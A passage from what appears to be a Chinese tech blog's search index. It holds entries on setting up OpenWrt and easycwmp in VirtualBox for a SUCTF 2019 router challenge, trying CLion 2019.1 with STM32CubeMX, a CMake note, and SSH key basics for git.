\u6700\u540e...\u63a5\u4e0b\u6765\u4f60\u53ef\u80fd\u4f1a\u56e0\u4e3a\u63a5\u4e0b\u6765\u767b\u5f55\u4e0d\u4e86SSH\u548cLuCI\u800c\u6000\u7591\u4eba\u751f\uff0c\u4e0d\u8981\u614c\uff0c\u56e0\u4e3a\u5b83\u5e2e\u4f60\u628a\u5bc6\u7801\u8bbe\u7f6e\u6210\u4e86flag...","title":"\u4f7f\u7528PandoraBox"},{"location":"ctf_writeup/suctf_2019/homerouter/#openwrt","text":"\u8fd9\u4e2a\u53ea\u8981\u641e\u4e2a\u865a\u62df\u673a\u5c31\u53ef\u4ee5\u8dd1\uff0c\u6bd4\u8f83\u7b80\u5355\u3002\u6ca1\u6709\u7684\u8bdd\u53ef\u4ee5\u5148\u4e0b\u8f7d\u4e00\u4e0b\u955c\u50cf\uff1a Index of /snapshots/targets/x86/64/ \u3002\uff08\u5176\u5b9e\u4e5f\u53ef\u4ee5\u73a9\u73a9Koolshare\u7684LEDE\uff09 \u5177\u4f53\u5b89\u88c5\u65b9\u6cd5\u53ef\u4ee5\u770b\u8fd9\u91cc\uff1a Run OpenWrt as a VirtualBox virtual machine \u3002 \u4e3b\u8981\u5c31\u662f\u89e3\u538b\uff0c\u7136\u540e\u8f6c\u76d8\uff1a Linux 1 VBoxManage convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi Windows 1 'C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe' convertfromraw --format VDI openwrt-x86-64-combined-squashfs.img openwrt-x86-64-combined-squashfs.vdi \u7136\u540eVirtualBox\u65b0\u5efa\u865a\u62df\u673a\uff0c\u4f7f\u7528\u5df2\u5b58\u5728\u7684\u865a\u62df\u786c\u76d8\u6587\u4ef6\u5373\u53ef\u3002\u542f\u52a8\u524d\u9700\u8981\u4fdd\u8bc1\u7f51\u53611\u662f\u4ec5\u4e3b\u673a\uff08Host-only\uff09\u9002\u914d\u5668\uff0c\u7f51\u53612\u662fNAT\uff0c\u4e0d\u7136\u53ef\u80fd\u4e0a\u4e0d\u4e86\u7f51\u3002\uff08Koolshare\u7684\u597d\u50cf\u4e0d\u5927\u4e00\u6837\uff0c\u81ea\u5df1\u770b\u6587\u6863\u5427\uff09 \u8981\u662f\u542f\u52a8\u540e\u7f51\u7edc\u8fd8\u662f\u6709\u95ee\u9898\u5c31\uff1a 1 uci show network \u770b\u4e00\u4e0b\u3002\u53ef\u4ee5\uff1a 1 2 3 uci set network.lan.ipaddr = '192.168.56.2' uci commit reboot \u628a\u4e0d\u5bf9\u7684\u6539\u6389\u3002 \u7136\u540e\u5c31\u53ef\u4ee5\u6765\u88c5easycwmp\u4e86\u3002\u73b0\u5728\u6ca1\u6709\u9884\u7f16\u8bd1\u7684\u5305\u4e86\uff0c\u53ea\u597d\u81ea\u5df1\u7f16\u8bd1\u3002 x86_64/easycwmp_1.8.1 x86_64/libmicroxml i386/easycwmp_1.8.1 i386/libmicroxml \u8fd9\u91cc\u8d34\u4e00\u4e0b\u81ea\u5df1\u7f16\u8bd1\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e0b\u8f7d\u5bf9\u5e94\u67b6\u6784\u7684\uff0c\u7136\u540e\uff1a 1 opkg install xxx.ipk \u975e\u8981\u81ea\u5df1\u7f16\u8bd1\u7684\u8bdd\u5c31\u770b\u7740 \u8fd9\u91cc\uff08pivasoftware/easycwmp\uff09 \u7684README\u7f16\u8bd1\u5427\u3002\u9700\u8981\u5148 git clone https://github.com/openwrt/openwrt \uff0c\u7136\u540e\u628a easycwmp-openwrt \u548c microxml \u7684\u538b\u7f29\u5305\u89e3\u538b\u5230 openwrt/package \u4e0b\uff0c\u8fd9\u4e2a\u65f6\u5019\u5728 openwrt \u76ee\u5f55\u4e0b\u6267\u884c\uff1a 1 make menuconfig \u5e94\u8be5\u5c31\u80fd\u5728Utilities\u91cc\u627e\u5230easycwmp\u4e86\u3002\u6839\u636e\u81ea\u5df1\u7684\u9700\u8981\u8fdb\u884c make \u5373\u53ef\u3002\u8981\u5f88\u957f\u65f6\u95f4\uff0c\u6784\u5efa\u8fc7\u7a0b\u4e2d\u9700\u8981\u4e0b\u8f7d\u5f88\u591a\u4e1c\u897f\uff0c\u5efa\u8bae\u4e8b\u5148\u641e\u597d\u900f\u660e\u4ee3\u7406\u3002\uff08\u4e5f\u53ef\u4ee5\u7528\u5bf9\u5e94\u67b6\u6784\u7684SDK\uff0c\u5177\u4f53\u770b\u6587\u6863\u5427\uff09 \u5b89\u88c5\u5b8c\u6210\u540e\u7684\u64cd\u4f5c\u5c31\u548c\u5728PandoraBox\u4e0b\u5dee\u4e0d\u591a\u4e86\uff0c\u5c31\u662f\u6539\u914d\u7f6e\uff0c\u7136\u540e\u8bfb\u65e5\u5fd7\uff0c\u518d\u542f\u52a8\u5ba2\u6237\u7aef\u5c31\u597d\u4e86\u3002","title":"\u4f7f\u7528OpenWRT\u8f6f\u8def\u7531"},{"location":"embedded/clion-2019.1/","text":"Failure \u4f3c\u4e4e\u5b58\u5728\u95ee\u9898\uff0c\u8bf7\u5148\u4e0d\u8981\u53c2\u8003\u4e0b\u6587 \u524d\u65b9\u63d0\u793a\uff1a\u8fd9\u7bc7\u6587\u7ae0\u6682\u65f6\u662f\u4e0d\u80fd\u7ed3\u5c3e\u4e86\uff0c\u56e0\u4e3a\u81ea\u5df1\u7684\u73af\u5883\u4f3c\u4e4e\u8ddf\u5f00\u53d1\u677f\u7684\u9a71\u52a8\u6709\u51b2\u7a81\uff0c\u63d2\u4e0a\u5c31\u84dd\u5c4f\uff0c\u6682\u65f6\u6ca1\u6709\u89e3\u51b3\u529e\u6cd5\uff0c\u7b49\u4e0b\u6b21\u627e\u53f0\u7535\u8111\u7136\u540e\u548cLinux\u5e73\u53f0\u4e0a\u7684\u4e00\u8d77\u5199\u4e86\u5427... \u4eca\u5929\u5f00\u673a\u7a81\u7136\u53d1\u73b0JetBrains Toolbox\u91cc\u6b63\u5728\u5347\u7ea7CLion\u548cIntelliJ IDEA\uff0c\u672c\u6765\u4ee5\u4e3a\u89814\u6708\u4efd\u4e86\u8fd8\u4f1a\u57282018.3.5\u4e0a\u7ee7\u7eed\u66f4\u65b0\uff0c\u5230\u5b98\u7f51\u4e0a\u4e00\u77a7\uff0c\u6709\u70b9\u60ca\u559c\uff1aCLion 2019.1\u53d1\u5e03\u4e86\u3002\u770b\u770b\u65b0\u7279\u6027\uff0c\u7adf\u7136\u662f\u5f00\u59cb\u652f\u6301STM32CubeMX\u548cOpenOCD\uff0c\u8d76\u7d27\u6765\u4f53\u9a8c\u4e00\u6ce2\u3002 \u5148\u6765\u8bf4\u8bf4\u6211\u76ee\u524d\u7684\u73af\u5883 \u8fd9\u4e0d\u662f\u4e00\u7bc7\u6559\u7a0b\u5411\u7684\u6587\u7ae0\uff0c\u6240\u4ee5\u5f53\u524d\u5217\u51fa\u7684\u73af\u5883\u5e76\u975e\u8981\u6c42\u4f60\u548c\u6211\u4e00\u6837\u3002\u8fd9\u53ea\u662f\u8bf4\u660e\u60c5\u51b5\uff08\u4e3a\u4e0b\u6587\u8e29\u5751\u57cb\u4e0b\u4f0f\u7b14\uff09\u800c\u5df2\u3002 \u64cd\u4f5c\u7cfb\u7edf\uff1aWindows 10 Education\u3002\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528\u5176\u5b83\u7684Windows\u7248\u672c\uff0c\u67d0\u4e9b\u53ef\u80fd\u4e0d\u542bWSL\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u5728Google\u4e0a\u5bfb\u6c42\u89e3\u51b3\u529e\u6cd5\u3002 \u672c\u573a\u4e3b\u89d2\uff1aJetBrains CLion 2019.1\u3002 \u5de5\u5177\u94fe\uff1aWSL Ubuntu\uff0c\u5f53\u524d\u53ea\u5b89\u88c5\u4e86\u5f00\u53d1C++\u63a7\u5236\u53f0\u7a0b\u5e8f\u5fc5\u8981\u7684\u5305\uff0c\u540e\u7eed\u4f1a\u6162\u6162\u5b89\u88c5\u8fd9\u6b21\u4f53\u9a8c\u9700\u8981\u7684\u4e1c\u897f\u3002\u611f\u89c9\u4f7f\u7528\u5176\u5b83\u5de5\u5177\u94fe\u5e94\u8be5\u4e5f\u662f\u53ef\u884c\u7684\u3002\u6211\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u5df2\u7ecf\u77e5\u9053\u4e86\u5b50\u7cfb\u7edf\uff0c\u4ee5\u53caCLion\u5982\u4f55\u4f7f\u7528\u5b83\uff0c\u5982\u679c\u7b54\u6848\u662f\u5426\u5b9a\u7684\uff0c\u90a3\u4e48\u4f60\u53ef\u80fd\u9700\u8981 CLion\u7684\u5173\u4e8eWSL\u7684\u5b98\u65b9\u6587\u6863 \uff0c\u53e6\u5916 \u8fd9\u91cc \u6709\u6211\u5bf9\u5b89\u88c5\u914d\u7f6e\u8fc7\u7a0b\u7684\u4e00\u4e2a\u5927\u4f53\u63cf\u8ff0\u3002 \u5176\u4ed6\u8f6f\u4ef6\uff1aSTM32CubeMX 5.1.0\uff0c\u4e4b\u524d\u5b89\u88c5\u8fc7\u6ca1\u600e\u4e48\u7528\u3002 \u8fd8\u6709\u4e2a\u5f88\u91cd\u8981\u7684...\u5f00\u53d1\u677f\uff1a\u6d0b\u68431\u53f7\u5f00\u53d1\u677f\u3002 \u9664\u6b64\u4e4b\u5916\u5e94\u8be5\u5c31\u6ca1\u4ec0\u4e48\u5176\u5b83\u7684\u5f71\u54cd\u56e0\u7d20\u4e86\u3002 \u8ba9\u6211\u4eec\u5f00\u59cb\u5427 \u4e0b\u9762\u662f\u4f53\u9a8c\u7684\u8fc7\u7a0b\uff0c\u5982\u679c\u4f60\u9700\u8981\u6587\u6863\uff0c\u53ef\u4ee5\u8bbf\u95ee \u8fd9\u91cc \u3002\u4e5f\u8bf7\u6ce8\u610f\uff0c\u4e0b\u6587\u4ec5\u4ec5\u662f\u4e00\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u70b9\u706f\u5b9e\u9a8c\uff0c\u66f4\u591a\u6280\u672f\u5411\u7684\u6587\u7ae0\u53ef\u80fd\u5728\u672a\u6765\u53d1\u51fa\u3002 \u6211\u4eec\u6765\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\uff0c\u9009\u4e2d Embedded \uff0c\u7136\u540e\u8d77\u4e2a\u540d\u5b57\uff1a \u8fdb\u5165\u4e3b\u754c\u9762\u540e\u4f1a\u53d1\u73b0\u9ed8\u8ba4\u914d\u7f6e\u7684\u5355\u7247\u673a\u578b\u53f7\u4e0d\u662f\u81ea\u5df1\u9700\u8981\u7684\uff1a \u70b9\u51fb Open with STM32CubeMX \uff0c\u542f\u52a8STM32CubeMX\uff1a \u5de6\u4e0a\u89d2\u6709\u4e2a\u578b\u53f7\uff0c\u5199\u7740STM32F030F4Px\uff0c\u5c31\u662f\u521a\u521aCLion\u9ed8\u8ba4\u914d\u7f6e\u7684\u90a3\u4e2a\uff0c\u70b9\u51fb\u5b83\uff0c\u628a\u5b83\u6362\u6210\u6211\u4eec\u9700\u8981\u7684\uff1a \u8fd9\u91cc\u7528\u7684\u6d0b\u6843\u5f00\u53d1\u677f\uff0c\u5355\u7247\u673a\u662fSTM32F103C8T6\uff0c\u9009\u597d\u5c31\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0a\u7684\u5f00\u59cb\u4e86\uff1a \u66f4\u6539\u5355\u7247\u673a\u578b\u53f7\u540e\uff0c\u9879\u76ee\u540d\u79f0\u7b49\u5c5e\u6027\u4f1a\u88ab\u6539\u53d8\uff0c\u6211\u4eec\u9700\u8981\u91cd\u65b0\u8bbe\u7f6e\u5b83\u4eec\u3002\u53e6\u5916\uff0c\u5de5\u5177\u94fe\u522b\u5fd8\u8bb0\u9009\u62e9 SW4STM32 \u3002 \u8fd9\u4e2a\u65f6\u5019\u5df2\u7ecf\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u751f\u6210\u4ee3\u7801\u7136\u540e\u56de\u5230CLion\u5f00\u59cb\u5de5\u4f5c\u4e86\u3002\u4e0d\u8fc7\u522b\u6025\uff0c\u6211\u4eec\u5148\u6765\u5f00\u4e2a\u706f\uff1a \u8fd9\u4e2a\u677f\u5b50\u4e0a\u5e94\u8be5\u662f\u5bf9PB0\u3001PB1\u8f93\u51fa\u9ad8\u7535\u5e73\u5c31\u53ef\u4ee5\u70b9\u4eae\u6838\u5fc3\u677f\u4e0a\u7684LED1\u3001LED2\uff0c\u968f\u4fbf\u8bbe\u7f6e\u4e00\u4e2a\uff0c\u7136\u540e\u5c31\u70b9\u51fb\u751f\u6210\u4ee3\u7801\u5427\u3002 \u56de\u5230CLion\uff0c\u8fd9\u4e2a\u65f6\u5019\u5e94\u8be5\u5df2\u7ecf\u68c0\u6d4b\u5230\u4e86\u4ee3\u7801\u66f4\u65b0\uff0c\u4f1a\u6709\u63d0\u793a\uff0c\u5e76\u4e14\u4f1a\u5f00\u59cb\u5efa\u7d22\u5f15\uff1a \u53ef\u4ee5\u770b\u5230\u5355\u7247\u673a\u578b\u53f7\u5df2\u7ecf\u6539\u53d8\u4e86\uff1a \u5176\u5b9e\u8fd9\u4e2a\u65f6\u5019\uff0c\u56e0\u4e3a\u6211\u6ca1\u6709OpenOCD\uff0c\u5f39\u7a97\u8b66\u544a\u4e86\u4e00\u4e0b\uff0c\u5fd8\u8bb0\u622a\u56fe\u4e86...\u8fd9\u4e2a\u7b49\u4e0b\u518d\u6298\u817e\u3002\u73b0\u5728\u5df2\u7ecf\u770b\u5230CMake\u8fd9\u8fb9\u7684\u4fe1\u606f\u663e\u793a\u627e\u4e0d\u5230arm-none-eabi-gcc\uff1a \u4e0d\u614c\uff0c\u6253\u5f00\u5b50\u7cfb\u7edf\u7684\u63a7\u5236\u53f0\uff0c\u5b89\u88c5\u4e00\u4e0b\uff1a 1 sudo apt install gcc - arm - none - eabi \u67d0\u4e9b\u539f\u56e0\uff0c\u6211\u4e00\u822c\u4f1a\u4e60\u60ef\u6027\u5148\uff1a 1 sudo apt update \u5982\u679c\u4f60\u5728\u8fd9\u91cc\u9047\u5230\u4e86\u7f51\u7edc\u95ee\u9898\uff0c\u90a3\u4e48\u4f60\u53ef\u80fd\u9700\u8981\u4ee3\u7406\uff0c\u6216\u8005\u5229\u7528\u955c\u50cf\u7ad9\uff0c\u6bd4\u5982 \u6e05\u534e\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf\u7ad9 | Tsinghua Open Source Mirror \u6216\u8005 USTC Open Source Software Mirror \u3002 \u4f3c\u4e4e\u5b58\u5728\u95ee\u9898\uff0c\u8bf7\u5148\u4e0d\u8981\u53c2\u8003\u4e0b\u6587 \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u56de\u5230CLion\uff0c\u5728CMake\u7684\u9519\u8bef\u4fe1\u606f\u5de6\u4fa7\u627e\u5230 Reload CMake Project \uff0c\u5e94\u8be5\u4e0d\u4f1a\u6709\u95ee\u9898\u4e86\u3002\u81f3\u4e8eOpenOCD\uff0c\u6d4f\u89c8\u4e86\u4e00\u4e0b\u5b98\u7f51\uff0c\u4f3c\u4e4e\u6ca1\u6709\u63d0\u4f9bWindows\u4e0b\u7684\u9884\u7f16\u8bd1\u7684\u5305\u3002\u4e0d\u8fc7\u6709\u975e\u5b98\u65b9\u7684\u9884\u7f16\u8bd1\u5305\u7684\u94fe\u63a5\uff0c\u4e0b\u8f7d\u4e00\u4efd\u89e3\u538b\u597d\uff0c\u7136\u540e\u7f16\u8f91Run Configuration\uff0c\u6307\u5b9a\u597d\u8def\u5f84\u548cBoard config file\uff0c\u5c31\u53ef\u4ee5Build\u4e86\u3002\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u5728cmake-build-debug\u91cc\u627e\u5230hex\u6587\u4ef6\u3002 \u5bf9\u4e8e\u8fd9\u5757\u5f00\u53d1\u677f\uff0c\u5e94\u8be5\u4f7f\u7528FlyMCU\u7684\u7b2c\u4e09\u65b9ISP\u70e7\u5165\u5373\u53ef\u3002\u5f00\u5934\u8bf4\u597d\u4e86\uff0c\u6211\u8fd8\u6ca1\u6709\u6d4b\u8bd5\u8fd9\u4e00\u6b65\uff0c\u4e0d\u77e5\u9053\u4f1a\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u4e0d\u8fc7\u6211\u5c3d\u5feb\u628a\u8fd9\u4e2a\u5751\u586b\u4e0a...","title":"\u5c1d\u9c9cCLion 2019.1\uff08Windows\uff09"},{"location":"embedded/clion-2019.1/#_1","text":"\u8fd9\u4e0d\u662f\u4e00\u7bc7\u6559\u7a0b\u5411\u7684\u6587\u7ae0\uff0c\u6240\u4ee5\u5f53\u524d\u5217\u51fa\u7684\u73af\u5883\u5e76\u975e\u8981\u6c42\u4f60\u548c\u6211\u4e00\u6837\u3002\u8fd9\u53ea\u662f\u8bf4\u660e\u60c5\u51b5\uff08\u4e3a\u4e0b\u6587\u8e29\u5751\u57cb\u4e0b\u4f0f\u7b14\uff09\u800c\u5df2\u3002 \u64cd\u4f5c\u7cfb\u7edf\uff1aWindows 10 Education\u3002\u5982\u679c\u4f60\u6b63\u5728\u4f7f\u7528\u5176\u5b83\u7684Windows\u7248\u672c\uff0c\u67d0\u4e9b\u53ef\u80fd\u4e0d\u542bWSL\uff0c\u4f60\u53ef\u80fd\u9700\u8981\u5728Google\u4e0a\u5bfb\u6c42\u89e3\u51b3\u529e\u6cd5\u3002 \u672c\u573a\u4e3b\u89d2\uff1aJetBrains CLion 2019.1\u3002 \u5de5\u5177\u94fe\uff1aWSL Ubuntu\uff0c\u5f53\u524d\u53ea\u5b89\u88c5\u4e86\u5f00\u53d1C++\u63a7\u5236\u53f0\u7a0b\u5e8f\u5fc5\u8981\u7684\u5305\uff0c\u540e\u7eed\u4f1a\u6162\u6162\u5b89\u88c5\u8fd9\u6b21\u4f53\u9a8c\u9700\u8981\u7684\u4e1c\u897f\u3002\u611f\u89c9\u4f7f\u7528\u5176\u5b83\u5de5\u5177\u94fe\u5e94\u8be5\u4e5f\u662f\u53ef\u884c\u7684\u3002\u6211\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u5df2\u7ecf\u77e5\u9053\u4e86\u5b50\u7cfb\u7edf\uff0c\u4ee5\u53caCLion\u5982\u4f55\u4f7f\u7528\u5b83\uff0c\u5982\u679c\u7b54\u6848\u662f\u5426\u5b9a\u7684\uff0c\u90a3\u4e48\u4f60\u53ef\u80fd\u9700\u8981 CLion\u7684\u5173\u4e8eWSL\u7684\u5b98\u65b9\u6587\u6863 \uff0c\u53e6\u5916 \u8fd9\u91cc \u6709\u6211\u5bf9\u5b89\u88c5\u914d\u7f6e\u8fc7\u7a0b\u7684\u4e00\u4e2a\u5927\u4f53\u63cf\u8ff0\u3002 \u5176\u4ed6\u8f6f\u4ef6\uff1aSTM32CubeMX 5.1.0\uff0c\u4e4b\u524d\u5b89\u88c5\u8fc7\u6ca1\u600e\u4e48\u7528\u3002 \u8fd8\u6709\u4e2a\u5f88\u91cd\u8981\u7684...\u5f00\u53d1\u677f\uff1a\u6d0b\u68431\u53f7\u5f00\u53d1\u677f\u3002 \u9664\u6b64\u4e4b\u5916\u5e94\u8be5\u5c31\u6ca1\u4ec0\u4e48\u5176\u5b83\u7684\u5f71\u54cd\u56e0\u7d20\u4e86\u3002","title":"\u5148\u6765\u8bf4\u8bf4\u6211\u76ee\u524d\u7684\u73af\u5883"},{"location":"embedded/clion-2019.1/#_2","text":"\u4e0b\u9762\u662f\u4f53\u9a8c\u7684\u8fc7\u7a0b\uff0c\u5982\u679c\u4f60\u9700\u8981\u6587\u6863\uff0c\u53ef\u4ee5\u8bbf\u95ee \u8fd9\u91cc \u3002\u4e5f\u8bf7\u6ce8\u610f\uff0c\u4e0b\u6587\u4ec5\u4ec5\u662f\u4e00\u4e2a\u975e\u5e38\u7b80\u5355\u7684\u70b9\u706f\u5b9e\u9a8c\uff0c\u66f4\u591a\u6280\u672f\u5411\u7684\u6587\u7ae0\u53ef\u80fd\u5728\u672a\u6765\u53d1\u51fa\u3002 \u6211\u4eec\u6765\u521b\u5efa\u4e00\u4e2a\u9879\u76ee\uff0c\u9009\u4e2d Embedded \uff0c\u7136\u540e\u8d77\u4e2a\u540d\u5b57\uff1a \u8fdb\u5165\u4e3b\u754c\u9762\u540e\u4f1a\u53d1\u73b0\u9ed8\u8ba4\u914d\u7f6e\u7684\u5355\u7247\u673a\u578b\u53f7\u4e0d\u662f\u81ea\u5df1\u9700\u8981\u7684\uff1a \u70b9\u51fb Open with STM32CubeMX \uff0c\u542f\u52a8STM32CubeMX\uff1a \u5de6\u4e0a\u89d2\u6709\u4e2a\u578b\u53f7\uff0c\u5199\u7740STM32F030F4Px\uff0c\u5c31\u662f\u521a\u521aCLion\u9ed8\u8ba4\u914d\u7f6e\u7684\u90a3\u4e2a\uff0c\u70b9\u51fb\u5b83\uff0c\u628a\u5b83\u6362\u6210\u6211\u4eec\u9700\u8981\u7684\uff1a \u8fd9\u91cc\u7528\u7684\u6d0b\u6843\u5f00\u53d1\u677f\uff0c\u5355\u7247\u673a\u662fSTM32F103C8T6\uff0c\u9009\u597d\u5c31\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0a\u7684\u5f00\u59cb\u4e86\uff1a \u66f4\u6539\u5355\u7247\u673a\u578b\u53f7\u540e\uff0c\u9879\u76ee\u540d\u79f0\u7b49\u5c5e\u6027\u4f1a\u88ab\u6539\u53d8\uff0c\u6211\u4eec\u9700\u8981\u91cd\u65b0\u8bbe\u7f6e\u5b83\u4eec\u3002\u53e6\u5916\uff0c\u5de5\u5177\u94fe\u522b\u5fd8\u8bb0\u9009\u62e9 SW4STM32 \u3002 \u8fd9\u4e2a\u65f6\u5019\u5df2\u7ecf\u53ef\u4ee5\u70b9\u51fb\u53f3\u4e0a\u89d2\u7684\u751f\u6210\u4ee3\u7801\u7136\u540e\u56de\u5230CLion\u5f00\u59cb\u5de5\u4f5c\u4e86\u3002\u4e0d\u8fc7\u522b\u6025\uff0c\u6211\u4eec\u5148\u6765\u5f00\u4e2a\u706f\uff1a \u8fd9\u4e2a\u677f\u5b50\u4e0a\u5e94\u8be5\u662f\u5bf9PB0\u3001PB1\u8f93\u51fa\u9ad8\u7535\u5e73\u5c31\u53ef\u4ee5\u70b9\u4eae\u6838\u5fc3\u677f\u4e0a\u7684LED1\u3001LED2\uff0c\u968f\u4fbf\u8bbe\u7f6e\u4e00\u4e2a\uff0c\u7136\u540e\u5c31\u70b9\u51fb\u751f\u6210\u4ee3\u7801\u5427\u3002 \u56de\u5230CLion\uff0c\u8fd9\u4e2a\u65f6\u5019\u5e94\u8be5\u5df2\u7ecf\u68c0\u6d4b\u5230\u4e86\u4ee3\u7801\u66f4\u65b0\uff0c\u4f1a\u6709\u63d0\u793a\uff0c\u5e76\u4e14\u4f1a\u5f00\u59cb\u5efa\u7d22\u5f15\uff1a \u53ef\u4ee5\u770b\u5230\u5355\u7247\u673a\u578b\u53f7\u5df2\u7ecf\u6539\u53d8\u4e86\uff1a \u5176\u5b9e\u8fd9\u4e2a\u65f6\u5019\uff0c\u56e0\u4e3a\u6211\u6ca1\u6709OpenOCD\uff0c\u5f39\u7a97\u8b66\u544a\u4e86\u4e00\u4e0b\uff0c\u5fd8\u8bb0\u622a\u56fe\u4e86...\u8fd9\u4e2a\u7b49\u4e0b\u518d\u6298\u817e\u3002\u73b0\u5728\u5df2\u7ecf\u770b\u5230CMake\u8fd9\u8fb9\u7684\u4fe1\u606f\u663e\u793a\u627e\u4e0d\u5230arm-none-eabi-gcc\uff1a \u4e0d\u614c\uff0c\u6253\u5f00\u5b50\u7cfb\u7edf\u7684\u63a7\u5236\u53f0\uff0c\u5b89\u88c5\u4e00\u4e0b\uff1a 1 sudo apt install gcc - arm - none - eabi \u67d0\u4e9b\u539f\u56e0\uff0c\u6211\u4e00\u822c\u4f1a\u4e60\u60ef\u6027\u5148\uff1a 1 sudo apt update \u5982\u679c\u4f60\u5728\u8fd9\u91cc\u9047\u5230\u4e86\u7f51\u7edc\u95ee\u9898\uff0c\u90a3\u4e48\u4f60\u53ef\u80fd\u9700\u8981\u4ee3\u7406\uff0c\u6216\u8005\u5229\u7528\u955c\u50cf\u7ad9\uff0c\u6bd4\u5982 \u6e05\u534e\u5927\u5b66\u5f00\u6e90\u8f6f\u4ef6\u955c\u50cf\u7ad9 | Tsinghua Open Source Mirror \u6216\u8005 USTC Open Source Software Mirror \u3002 \u4f3c\u4e4e\u5b58\u5728\u95ee\u9898\uff0c\u8bf7\u5148\u4e0d\u8981\u53c2\u8003\u4e0b\u6587 \u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u56de\u5230CLion\uff0c\u5728CMake\u7684\u9519\u8bef\u4fe1\u606f\u5de6\u4fa7\u627e\u5230 Reload CMake Project \uff0c\u5e94\u8be5\u4e0d\u4f1a\u6709\u95ee\u9898\u4e86\u3002\u81f3\u4e8eOpenOCD\uff0c\u6d4f\u89c8\u4e86\u4e00\u4e0b\u5b98\u7f51\uff0c\u4f3c\u4e4e\u6ca1\u6709\u63d0\u4f9bWindows\u4e0b\u7684\u9884\u7f16\u8bd1\u7684\u5305\u3002\u4e0d\u8fc7\u6709\u975e\u5b98\u65b9\u7684\u9884\u7f16\u8bd1\u5305\u7684\u94fe\u63a5\uff0c\u4e0b\u8f7d\u4e00\u4efd\u89e3\u538b\u597d\uff0c\u7136\u540e\u7f16\u8f91Run Configuration\uff0c\u6307\u5b9a\u597d\u8def\u5f84\u548cBoard config file\uff0c\u5c31\u53ef\u4ee5Build\u4e86\u3002\u5b8c\u6210\u540e\uff0c\u53ef\u4ee5\u5728cmake-build-debug\u91cc\u627e\u5230hex\u6587\u4ef6\u3002 \u5bf9\u4e8e\u8fd9\u5757\u5f00\u53d1\u677f\uff0c\u5e94\u8be5\u4f7f\u7528FlyMCU\u7684\u7b2c\u4e09\u65b9ISP\u70e7\u5165\u5373\u53ef\u3002\u5f00\u5934\u8bf4\u597d\u4e86\uff0c\u6211\u8fd8\u6ca1\u6709\u6d4b\u8bd5\u8fd9\u4e00\u6b65\uff0c\u4e0d\u77e5\u9053\u4f1a\u6709\u4ec0\u4e48\u95ee\u9898\uff0c\u4e0d\u8fc7\u6211\u5c3d\u5feb\u628a\u8fd9\u4e2a\u5751\u586b\u4e0a...","title":"\u8ba9\u6211\u4eec\u5f00\u59cb\u5427"},{"location":"misc/cmake_source_and_binary_directory/","text":"https://stackoverflow.com/questions/11143062/getting-cmake-to-build-out-of-source-without-wrapping-scripts/11144109#11144109 \u540e\u7eed\u66f4\u65b0","title":"CMake\u6307\u5b9a\u6e90\u7801\u76ee\u5f55\u548c\u6784\u5efa\u76ee\u5f55"},{"location":"misc/git_clone_via_ssh/","text":"\u8fd9\u56de\u6211\u4eec\u6765\u8ba8\u8bba\u4e00\u4e0b\u901a\u8fc7SSH\u6765git clone\u3002\u8fd8\u662f\u5199\u7ed9\u5c0f\u767d\u770b\u7684\uff0c\u5927\u4f6c\u4eec\u53ef\u4ee5\u65e0\u89c6\u4e86\u3002 \u66f4\u65b0\uff1a\u52a0\u5165Windows\u4e0b\u7684\u5c11\u8bb8\u63d0\u793a\u3002 \u73b0\u5728\u7684\u73af\u5883\u662fopenSUSE Tumbleweed\uff08\u5176\u5b9e\u8fd9\u5e76\u4e0d\u91cd\u8981\uff0c\u4e5f\u9002\u7528\u4e8emacOS\u7b49\u64cd\u4f5c\u7cfb\u7edf\uff09\uff0c\u4ee3\u7801\u6258\u7ba1\u7ad9\u70b9\u662fAzure DevOps\uff08\u6bcf\u4e2a\u7ad9\u70b9\u7684\u5177\u4f53\u64cd\u4f5c\u5e94\u8be5\u5927\u540c\u5c0f\u5f02\uff0c\u7f51\u7ad9\u4e00\u822c\u4f1a\u63d0\u4f9b\u76f8\u5e94\u7684\u6587\u6863\uff09\u3002\u53e6\u5916\uff0c\u5982\u679c\u4f60\u5728\u4f7f\u7528\u4e00\u4e9b\u5229\u7528SSH key\u8fdb\u884c\u8fde\u63a5\u7684\u4e3b\u673a\u4e0a\u9047\u5230\u95ee\u9898\uff0c\u53ef\u80fd\u4e5f\u53ef\u4ee5\u53c2\u8003\u8fd9\u91cc\u3002 \u6211\u8fd8\u662f/*\u5f88\u61d2\u5730*/\u5148\u628a\u6587\u6863\u5148\u653e\u4e0a\u6765\uff1a Use SSH key authentication \u8fd9\u91cc\u7684\u539f\u7406\u5927\u6982\u662f\u8fd9\u6837\u7684\uff08\u9996\u5148\u4f60\u53ef\u80fd\u8981\u5bf9 \u516c\u5f00\u5bc6\u94a5\u52a0\u5bc6 \u7684\u539f\u7406\u6709\u7a0d\u5fae\u7684\u7406\u89e3\uff09\uff1a\u4f60\u9700\u8981\u5148\u751f\u6210\u4e00\u5bf9\u516c\u94a5\u548c\u79c1\u94a5\uff0c\u516c\u94a5\u7528\u6765\u52a0\u5bc6\u3001\u53ef\u4ee5\u968f\u610f\u516c\u5f00\uff0c\u4f46\u662f\u4fe1\u606f\u4e00\u65e6\u88ab\u516c\u94a5\u52a0\u5bc6\uff0c\u53ea\u6709\u6301\u6709\u5bf9\u5e94\u7684\u79c1\u94a5\u624d\u80fd\u89e3\u5f00\uff0c\u5f53\u7136\uff0c\u79c1\u94a5\u9700\u8981\u59a5\u5584\u4fdd\u7ba1\u3002 